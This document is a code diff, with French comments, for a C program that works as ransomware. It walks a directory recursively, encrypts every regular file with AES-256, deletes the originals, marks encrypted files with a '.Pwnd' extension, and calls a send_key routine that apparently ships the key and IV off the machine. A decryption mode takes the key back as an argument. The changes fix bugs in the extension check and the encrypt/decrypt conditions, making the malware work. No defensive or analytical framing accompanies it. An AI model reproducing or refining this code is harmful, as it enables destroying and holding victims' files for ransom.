@@ -16,22 +16,22 @@ void usage()
 
 int is_encrypted(char *filename) //Ici on assume que le nom de nos fichiers cryptés seront en ".Pwnd"
 {
-	int n = strlen(filename)-4;
-	char extention[4] ;
+	int n = strlen(filename)-5;
+	char extention[5] ;
 
-	for(int i=0; i<5;i++)
+	for(int i=0; i<6;i++)
 	{
 		extention[i] = filename[n+i];
 	}
 
 	if(strcmp(extention,".Pwnd")==0)
 	{
-		printf("Le fichier est déja crypter");
+		// printf("Le fichier est déja crypter\n");
 		return 0 ;
 	}
 	else
 	{
-		printf("Le fichier n'est pas encore crypter");
+		// printf("Le fichier n'est pas encore crypter\n");
 		return 1;
 	}
 }
@@ -63,13 +63,13 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 				listdir(path, iv, key, de_flag);
 			}
 			
-			if(de_flag=='e' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==1)
+			if(de_flag=='e' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==0)
 			{				
-				encrypt(key, iv, path);				
-				remove(path);
+				encrypt(key, iv, path);
+				remove(path);				
 			}
 			
-			else if(de_flag=='d' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==0)
+			else if(de_flag=='d' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==1)
 			{
 				decrypt(key, iv, path);
 				remove(path);
@@ -139,15 +139,18 @@ int main (int argc, char * argv[])
 		int sizeKey = AES_256_KEY_SIZE; 
 		int sizeIv = AES_BLOCK_SIZE;
 		
-		char * pKey = (char *) malloc(sizeof(key)*2+1);
-		char * pIv = (char *) malloc(sizeof(iv)*2+1);
-		
 		if(strcmp(argv[2], "-enc")==0) 
 		{
+			char * pKey = (char *) malloc(sizeof(key)*2+1);
+			char * pIv = (char *) malloc(sizeof(iv)*2+1);
+			
 			printf("The directory is %s\n", argv[1]);
 			generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 			send_key(pKey, pIv);
 			listdir(argv[1], iv, key, 'e');
+			
+			free((char *)pKey);
+			free((char *)pIv);
 		}
 		
 		if (strcmp(argv[2], "-dec")==0)
@@ -156,9 +159,6 @@ int main (int argc, char * argv[])
 			hexa_to_bytes(argv[4] , iv, sizeIv);
 			listdir(argv[1], iv, key, 'd');
 		}
-		
-		free((char *)pKey);
-		free((char *)pIv);
 	}
 	
 	else
